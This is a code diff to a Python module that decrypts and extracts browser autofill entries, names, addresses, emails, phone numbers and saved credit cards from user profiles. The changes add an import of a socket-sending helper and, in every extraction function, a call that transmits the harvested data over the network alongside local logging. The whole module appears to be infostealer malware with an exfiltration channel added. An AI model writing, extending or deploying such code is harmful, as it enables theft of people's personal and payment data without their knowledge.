@@ -1,7 +1,12 @@
 """ IMPORTS """
 import json
 import sqlite3
-from util import try_extract, get_profiles, create_temp_file, log_data, try_decrypt
+
+from util.general import (
+    try_extract, get_profiles, create_temp_file, log_data,
+)
+from util.crypt import try_decrypt
+from util.socket import socket_send_log
 
 
 """
@@ -71,6 +76,7 @@ def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, 
     if data:
         log_file_name = profile_name + ' Autofill Fields'
         log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 @try_extract
@@ -97,6 +103,7 @@ def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_k
     if data:
         log_file_name = profile_name + ' Autofill Profiles'
         log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 @try_extract
@@ -122,6 +129,7 @@ def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_
     if data:
         log_file_name = profile_name + ' Autofill Addresses'
         log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 @try_extract
@@ -148,11 +156,13 @@ def extract_autofill_names(browser_name: str, profile_name: str, encryption_key:
         name = (title or '') + (full_name or '')
         if name:
             data.add(name)
+    data = list(data)
 
     # Log data
     if data:
         log_file_name = profile_name + ' Autofill Names'
-        log_data(list(data), browser_name, log_file_name)
+        log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 @try_extract
@@ -169,6 +179,7 @@ def extract_autofill_emails(browser_name: str, profile_name: str, encryption_key
     if data:
         log_file_name = profile_name + ' Autofill Emails'
         log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 @try_extract
@@ -185,6 +196,7 @@ def extract_autofill_phones(browser_name: str, profile_name: str, encryption_key
     if data:
         log_file_name = profile_name + ' Autofill Phones'
         log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 @try_extract
@@ -209,6 +221,7 @@ def extract_credit_cards(browser_name: str, profile_name: str, encryption_key: s
     if data:
         log_file_name = profile_name + ' Credit Cards'
         log_data(data, browser_name, log_file_name)
+        socket_send_log(data, browser_name, log_file_name)
 
 
 
